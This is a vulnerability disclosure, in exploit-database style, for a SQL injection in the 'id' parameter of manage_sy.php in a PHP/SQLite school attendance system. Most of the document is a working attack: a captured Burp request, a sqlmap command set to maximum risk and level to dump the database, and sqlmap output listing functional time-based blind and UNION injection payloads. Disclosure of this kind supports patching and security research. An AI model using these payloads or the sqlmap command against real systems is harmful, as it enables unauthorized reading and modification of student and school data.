# School Intramurals - Student Attendance Management System - SQL Injection
+ **Exploit Title:** School Intramurals - Student Attendance Management System - SQL Injection
+ **Exploit Author:** G_GX
+ **Vendor Homepage:** https://www.sourcecodester.com/php/15920/school-intramurals-student-attendance-management-system-using-php-and-sqlite.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=15920&title=School+Intramurals+-+Student+Attendance+Management+System+using+PHP+and+SQLite#google_vignette
+ **Version:** V1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58

## Description:
Student Attendance Management System allows SQL Injection via the 'id' parameter at "http://127.0.0.1/intrams_sams/manage_sy.php?id=1". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://127.0.0.1/intrams_sams/manage_sy.php?id=1"
+ Click view button.
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /intrams_sams/manage_sy.php?id=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=0ksd75n2r2eu1n5fahs4hoopmu
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23
Priority: u=1
```
+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: id=1' OR 7146=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- HwjW

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=1' UNION ALL SELECT CHAR(113,122,106,113,113)||CHAR(107,83,104,76,84,106,111,77,119,79,65,79,108,118,87,88,86,106,70,101,115,118,112,113,101,68,77,106,103,84,110,99,84,103,110,70,73,98,87,78)||CHAR(113,106,113,112,113),NULL,NULL,NULL-- zjTZ
---
[14:05:28] [INFO] the back-end DBMS is SQLite
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: SQLite
```
+ The current database is sqlite.

![image](https://github.com/GAO-UNO/cve/assets/131429880/a744ede4-9e24-453c-ac6e-f2ec1d442cf8)
